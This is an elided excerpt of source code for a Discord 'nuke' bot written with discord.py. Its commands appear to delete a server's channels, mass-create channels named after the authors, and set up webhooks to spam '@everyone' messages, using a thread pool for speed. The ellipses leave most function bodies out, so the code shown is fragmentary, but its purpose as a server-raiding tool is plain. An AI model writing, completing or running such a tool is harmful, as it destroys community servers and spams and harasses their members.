...
@bot.command()
async def ping(ctx):
    await ctx.send(f'Pong !! {round(bot.latency * 1000, 2)}', delete_after=2)
...
async def delchans(ctx):
    ...
    await ctx.guild.create_text_channel(name='MADE BY Verlox.xy#2735')
...
async def everyone(ctx, *, message):
    ...
    async def create_webhook(channel):
        try:
            webhook = await channel.create_webhook(name='P4R4DOX#5353')
...
async def nuke(ctx, *, message):
    ...
    async def make_alot_chans(ctx):
        channel = await ctx.guild.create_text_channel(name='Verlox.xy#2735')
        with ThreadPoolExecutor() as executor:
